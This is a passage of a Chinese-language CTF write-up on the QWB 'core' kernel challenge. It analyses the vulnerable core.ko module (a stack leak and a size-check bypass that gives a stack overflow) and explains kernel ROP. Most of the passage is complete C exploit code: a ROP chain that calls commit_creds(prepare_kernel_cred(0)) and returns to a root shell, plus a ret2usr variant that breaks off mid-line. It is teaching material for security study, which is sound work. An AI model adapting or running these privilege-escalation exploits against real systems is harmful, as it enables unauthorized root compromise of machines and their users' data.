<p>前面实在创建设备驱动，挂载设备，之后将kallsyms的内容拷贝到/tmp/kallsyms文件中，<code>kptr_restrict</code>为1表示root用户可以读取内核符号地址而普通用户不能。同理<code>dmesg_restrict</code>为1表示root用户可以查看dmesg信息而普通用户不能。</p>
<p>后面是设置网卡和路由信息，启动了一个uid为1000的普通用户所在的shell，poweroff这行是设置120s定时关机，我们为了避免干扰做题先注释掉，同样为了之后能看text段的基址我们把uid改成0，即root用户。</p>
<p>最后的insmod插入了一个内核模块<code>core.ko</code>，这个就是本题的漏洞模块，我们等会来分析它。现在把文件系统重新打包(文件系统中有个打包脚本，参数为打包的压缩文件名，打包之后拷到上层目录即可)</p>
<p>下面分析core.ko</p>
<p>在ioctl函数里实现了几种功能，其中arg1表示choice，arg2为参数2。</p>
<ol>
<li>arg1=0x6677889B时，调用core_read(arg2)，从v4[off]拷贝0x40长度的数据到arg2指定的用户地址，这里off是一个全局变量</li>
<li>arg1=0x6677889C，将arg2赋值给off(结合1和2我们可以泄露栈上数据)</li>
<li>arg1=0x6677889A，调用core_copy_func，arg2指定size，拷贝arg2长度的数据从name到栈局部变量v1，这里检查了size要小于等于0x3f，但是qememcpy用的类型是int16，因此我们传入一个负数即可绕过检查(因为size指定，这里可以栈溢出)</li>
<li>core_write函数把用户空间的数据拷贝到bss的全局变量name上，size也是用户指定的长度</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> arg1, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( arg1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: %d\n"</span>);</span><br><span class="line">      off = arg2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: called core_copy\n"</span>);</span><br><span class="line">      core_copy_func(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">core_read</span><span class="params">(__int64 user_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 user_addr1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  user_addr1 = user_addr;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_read\n"</span>);</span><br><span class="line">  printk(<span class="string">"\x016%d %p\n"</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(user_addr1, &amp;v4[off], <span class="number">64L</span>L) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x3F</span> )</span><br><span class="line">    printk(<span class="string">"\x016Detect Overflow"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="keyword">unsigned</span> __int16)size);  <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 user_addr, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  size = a3;</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, user_addr, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size;</span><br><span class="line">  printk(<span class="string">"\x016core: error copying data from userspacen"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们现在有地址泄露和栈溢出，用到的就是这里讲到的kernel rop，思路如下：</p>
<ol>
<li>利用ioctl结合core_read泄露地址及canary</li>
<li>利用core_write吧gadgets写到name上</li>
<li>利用copy_func将gadgets写到栈上</li>
<li>通过rop执行<code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，执行system(“/bin/sh”)起shell(使用<code>swapgs;iretq</code>来进行切换，但最开始要使用<code>save_status</code>保存寄存器的状态)</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>tips1:ctrl+A再按X可以让qemu退出</p>
<p>使用<code>gdb ./vmlinux -q</code>调试内核，在qemu内部使用<code>cat /sys/module/core/sections/.text</code>查看基址，使用<code>add-symbol-file ./core.ko [text_base]</code>增加符号表，<code>b core_read</code>添加断点，<code>target remote localhost:1234</code>开始调试。</p>
<h4 id="exp-c-1"><a href="#exp-c-1" class="headerlink" title="exp.c"></a>exp.c</h4><p>最后在构造rop的时候的栈结构是<br>p_rdi<br>0<br>prepare_kernel_cred<br>mov rdi, rax<br>commit_creds<br>但是gadgets里没有直接能用的<code>mov rdi, rax; ret;</code>所以这里迂回了一下。构造的结构是：<br>p_rdi<br>0<br>prepare_kernel_cred<br>p_rdx_ret<br>p_rcx_ret<br>mov rdi, rax; call rdx;<br>commit_creds<br>注意写exp之前要先sava_status,在 64 位系统中执行 iretq 指令前需要执行一下 swapgs 指令，该指令将 gs 寄存器的值与 MSR 地址 中的值交换。在内核态常规操作（如系统调用）的入口处，执行 swapgs 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 swapgs<br>iretq用来恢复用户空间，需要给出之前保存的寄存器的值。恢复到用户空间之后一个<code>ret</code>到我们的<code>system(&quot;/bin/sh&quot;)</code>即可起root shell。</p>
<p>还有一个有意思的地方在于我们明明是在write里泄露的canary，在copy函数里进行的栈溢出，但是canary和栈布局都是一样的，而且在gdb中看到的输入地址距离rbp相去甚远，实际上却恰如其分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> FindVmlinuxBase()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]p_rdi addr:%p\n"</span>,<span class="number">0xffffffff81000b2f</span>+offset);</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>利用的是内核态位于ring 0，可以执行用户态的函数，我们不必自己构造调用链，而可以直接在用户态构造好我们需要的函数，在内核rop的时候直接调用即可，当然这些函数用户态是没有的，我们还是得先泄露出来。exp编写如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> FindVmlinuxBase()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; 